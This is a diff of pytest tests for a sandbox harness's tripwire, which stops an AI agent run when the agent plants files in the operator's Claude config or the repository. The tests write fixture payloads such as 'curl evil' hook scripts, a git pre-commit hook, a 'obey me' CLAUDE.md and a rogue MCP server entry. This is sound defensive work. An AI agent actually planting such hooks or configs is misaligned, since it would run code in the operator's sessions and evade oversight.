@@ -579,6 +579,15 @@ class FakeOps:
 
 
 @pytest.fixture(autouse=True)
+def _hermetic_claude_home(tmp_path_factory, monkeypatch):
+    """Трипвайр конфиг-поверхности (дизайн песочницы §9) не читает настоящий
+    ~/.claude оператора: это и негерметично, и дорого (plugins/ — ~10k
+    файлов на каждый вызов агента в сотнях тестов)."""
+    home = tmp_path_factory.mktemp("claude-home")
+    monkeypatch.setattr(runner, "_claude_home", lambda: home)
+
+
+@pytest.fixture(autouse=True)
 def _disp_harness_env(monkeypatch):
     """Детерминированный харнесс-слой для disp-конфига во всём модуле.
 
@@ -8517,3 +8526,107 @@ def test_authoring_without_code_keeps_schema1(
     charter = (Path(state.target_dir) / state.bundle_dir / "00-charter.md").read_text()
     assert charter_guard.read_charter(charter).schema == 1
     assert not any(c[0] == "charter_codes_elsewhere" for c in ops.calls)
+
+
+# --- дизайн песочницы §9: трипвайр конфиг-поверхности вокруг вызова агента ---
+
+def _plant_config(tmp_path, monkeypatch, run_id: str, plant) -> object:
+    """Прогон W1, где авторский вызов charter вызывает `plant(target_dir)`.
+    ~/.claude — временный (подмена `runner._claude_home`)."""
+    home = tmp_path / "home"
+    (home / ".claude").mkdir(parents=True)
+    (home / ".claude" / "settings.json").write_text("{}", encoding="utf-8")
+    monkeypatch.setattr(runner, "_claude_home", lambda: home / ".claude")
+
+    class _Plant(FakeOps):
+        def author(self, target_dir, kind, subject, bundle_dir,
+                   brief_context=None):
+            rc = super().author(target_dir, kind, subject, bundle_dir,
+                                brief_context=brief_context)
+            if kind == "charter":
+                plant(Path(target_dir), home)
+            return rc
+
+    return _drive_waves_to(tmp_path, run_id, _Plant(), monkeypatch, 1)
+
+
+@pytest.mark.parametrize(
+    ("where", "named"),
+    [
+        (lambda t, h: (h / ".claude/settings.json").write_text(
+            '{"hooks": {"SessionStart": []}}'), "settings.json"),
+        (lambda t, h: (h / ".claude/hooks").mkdir() or
+            (h / ".claude/hooks/x.sh").write_text("curl evil"), "hooks/x.sh"),
+        (lambda t, h: (h / ".claude/CLAUDE.md").write_text("obey me"), "CLAUDE.md"),
+        (lambda t, h: (t / ".git/hooks").mkdir(parents=True, exist_ok=True) or
+            (t / ".git/hooks/pre-commit").write_text("curl evil"), "pre-commit"),
+        (lambda t, h: (t / ".mcp.json").write_text("{}"), ".mcp.json"),
+        (lambda t, h: (t / ".claude").mkdir(exist_ok=True) or
+            (t / ".claude/settings.json").write_text("{}"), ".claude/settings.json"),
+        (lambda t, h: (h / ".claude/plugins").mkdir(exist_ok=True) or
+            (h / ".claude/plugins/installed_plugins.json").write_text('{"x": 1}'),
+         "installed_plugins.json"),
+        (lambda t, h: (h / ".claude.json").write_text(json.dumps(
+            {"mcpServers": {"evil": {"command": "/tmp/evil"}}})), ".claude.json"),
+    ],
+    ids=["home-settings", "home-hook", "home-claude-md", "repo-git-hook",
+         "repo-mcp", "repo-claude-settings", "plugin-registry", "user-mcp"],
+)
+def test_config_surface_plant_stops_the_run(
+    tmp_path, runs_root, monkeypatch, where, named
+):
+    """Хук, посаженный агентом, исполнился бы в интерактивных сессиях
+    оператора (или при его следующем коммите): стоп с названным файлом,
+    без автоматического отката — это файлы оператора."""
+    state = _plant_config(tmp_path, monkeypatch, "r-cfg-" + named.replace("/", "-"), where)
+    assert state.status == "stopped_author"
+    reason = (rs.run_dir(state.run_id) / "stop-reason.txt").read_text(encoding="utf-8")
+    assert named in reason
+
+
+def test_config_surface_ignores_claude_state_dirs(tmp_path, runs_root, monkeypatch):
+    """projects/, todos/ и прочее состояние интерактивных сессий не
+    наблюдаются: параллельная сессия оператора пишет туда постоянно, и
+    ложный стоп на каждом прогоне приучил бы отключать трипвайр."""
+    def state_writes(t, h):
+        (h / ".claude/projects/p").mkdir(parents=True)
+        (h / ".claude/projects/p/memory.md").write_text("m")
+        (h / ".claude/todos").mkdir()
+        (h / ".claude/todos/t.json").write_text("[]")
+        # кэш плагинов пишут живые сессии (ревью #489) — не наблюдается
+        (h / ".claude/plugins/cache/p").mkdir(parents=True)
+        (h / ".claude/plugins/cache/p/index.js").write_text("x")
+        # ~/.claude.json сессии пишут постоянно; наблюдаются только mcpServers
+        (h / ".claude.json").write_text(json.dumps({"numStartups": 42}))
+
+    state = _plant_config(tmp_path, monkeypatch, "r-cfg-state", state_writes)
+    assert state.status != "stopped_author"
+
+
+def test_config_surface_watches_scripts_that_hooks_reference(
+    tmp_path, runs_root, monkeypatch
+):
+    """Хук ссылается на скрипт ВНЕ ~/.claude (у оператора — GitKraken `gk`):
+    подмена скрипта исполнится так же, как подмена хука."""
+    script = tmp_path / "tools" / "hook.sh"
+    script.parent.mkdir()
+    script.write_text("#!/bin/sh\ntrue\n", encoding="utf-8")
+    home = tmp_path / "home"
+    (home / ".claude").mkdir(parents=True)
+    (home / ".claude" / "settings.json").write_text(json.dumps({"hooks": {
+        "SessionStart": [{"hooks": [{"type": "command", "command": f"{script} --x"}]}]
+    }}), encoding="utf-8")
+    monkeypatch.setattr(runner, "_claude_home", lambda: home / ".claude")
+
+    class _Swap(FakeOps):
+        def author(self, target_dir, kind, subject, bundle_dir, brief_context=None):
+            rc = super().author(target_dir, kind, subject, bundle_dir,
+                                brief_context=brief_context)
+            if kind == "charter":
+                script.write_text("#!/bin/sh\ncurl evil\n", encoding="utf-8")
+            return rc
+
+    state = _drive_waves_to(tmp_path, "r-cfg-hookscript", _Swap(), monkeypatch, 1)
+    assert state.status == "stopped_author"
+    reason = (rs.run_dir(state.run_id) / "stop-reason.txt").read_text(encoding="utf-8")
+    assert "hook.sh" in reason
